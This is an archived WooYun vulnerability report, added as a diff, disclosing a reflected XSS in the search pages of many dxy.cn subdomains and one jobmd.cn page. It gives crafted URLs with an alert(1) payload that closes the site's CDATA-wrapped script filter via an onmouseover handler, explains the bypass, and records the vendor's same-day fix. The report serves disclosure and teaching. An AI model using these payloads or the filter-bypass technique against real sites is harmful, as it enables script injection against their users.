@@ -1,0 +1,237 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		丁香园全部子站某处反射型xss(附分析过程)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		丁香园全部子站某处反射型xss(附分析过程)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/梧桐雨">梧桐雨</a> 
+</li><li>提交时间：		2013-03-19 15:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-03-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-08：	细节向普通白帽子公开<br/>
+									2013-04-18：	细节向实习白帽子公开<br/>
+									2013-05-03：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">第一次发的时候又没过。。是分析的不彻底么？今天附上分析过程和结果，希望通过吧~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">再发一次- -不给过俺就直接报给大辉了，虽然这个反射的xss影响很局限，但是我绝得发出来还是具有学习的参考价值的。<br />
+<br />
+丁香园的搜索框是比较奇怪的，我遇到这么多搜索框，都是有对&lt;&gt;或者&quot;等特殊字符进行过滤了。唯独有几个子站（很多啊，几乎影响全部）是没过滤的。<br />
+<br />
+受影响的站点有：<br />
+<br />
+</p><pre><code>http://meeting.dxy.cn/search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot; <br />
+<br />
+onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+<br />
+http://ihealth.dxy.cn/search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%<br />
+<br />
+20onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+http://heart.dxy.cn/search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%<br />
+<br />
+20onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+http://infect.dxy.cn/search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%<br />
+<br />
+20onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+http://endo.dxy.cn/search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%<br />
+<br />
+20onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+http://oncol.dxy.cn//search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%<br />
+<br />
+20onmouseover=&quot;alert(1)////&gt;<br />
+<br />
+http://yao.dxy.cn/search.do?keywords=1%3E%3Cscript/src=%22%3C/script%3Ealert%281%29//%22%<br />
+<br />
+20onmouseover=%22alert%281%29////%3E<br />
+<br />
+http://6d.dxy.cn//search.do?keywords=1&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%20onmouseover=&quot;alert(1)////&gt;</code></pre><p class='detail'><br />
+<br />
+都存在xss，可能我还没总结完，丁香园的同学还需要自查一下。<br />
+<br />
+<br />
+<br />
+在搜索框输入&lt;script&gt;alert(1)&lt;/script&gt;进行测试的时候。<br />
+<br />
+发现过滤成了：&lt;script&gt;&lt;![CDATA[alert(1)]]&gt;&lt;/script&gt;<br />
+<br />
+当时摸索着，很难有突破，也不知道他的过滤方法是什么。直到后来，请教了某大牛，结合自己的总结，总算把代码给执行出来了。<br />
+<br />
+<br />
+<br />
+需要配合onmouseover事件执行，比较鸡肋，但是受影响的子站众多，所以我给自评10rank<br />
+<br />
+<br />
+<br />
+结合上文，我们知道，凡是没过滤特殊字符的过滤都是不完整的。因而，丁香园的程序员同样犯了这样的错误。因此，我们只需要构造我们只需要构造</p><pre><code>&gt;&lt;script/src=&quot;&lt;/script&gt;alert(1)//&quot;%20onmouseover=&quot;alert(1)////&gt;</code></pre><p class='detail'> 就能绕过限制。<br />
+<br />
+其中，&gt;是闭合，当然，这里的尖括号是没过滤的。不然就没办法执行&lt;script&gt;里的东西了。我们知道，在js中，&lt;/script&gt;是具有最高优先级别的，是可以在任何时候都中断js代码，我不知道</p><pre><code>&lt;script&gt;&lt;![CDATA[alert(1)]]&gt;&lt;/script&gt;</code></pre><p class='detail'>里头的逻辑，我把他中断还不行么？最后，注释掉错误，配合alert，小窗口就出来了 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/19144229163a61e217b7ad2b6969c55fd42ad80c.jpg" target="_blank"><img src="../images/19144229163a61e217b7ad2b6969c55fd42ad80c.jpg" alt="123.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+再额外送上还有另一个地方的搜索处的XSS:<br />
+<br />
+<br />
+<br />
+http://ent.jobmd.cn/search?keywords=%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19144703956a08366c884f92f02944329cf6c9d6.jpg" target="_blank"><img src="../images/19144703956a08366c884f92f02944329cf6c9d6.jpg" alt="1234.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">还是得好好过滤啊，不能走旁门左道:)<br />
+<br />
+<br />
+<br />
+过滤方法：参考你们前面的几个搜索框的过滤吧。其他的问题暂时没发现。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/梧桐雨" title="梧桐雨">梧桐雨</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020304" title="丁香园全部子站某处反射型xss(附分析过程)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-03-19 15:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢挖洞，火速修复中... <br />
+<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-03-19：已经修复. 感谢 @梧桐雨 大侠.</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20304";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
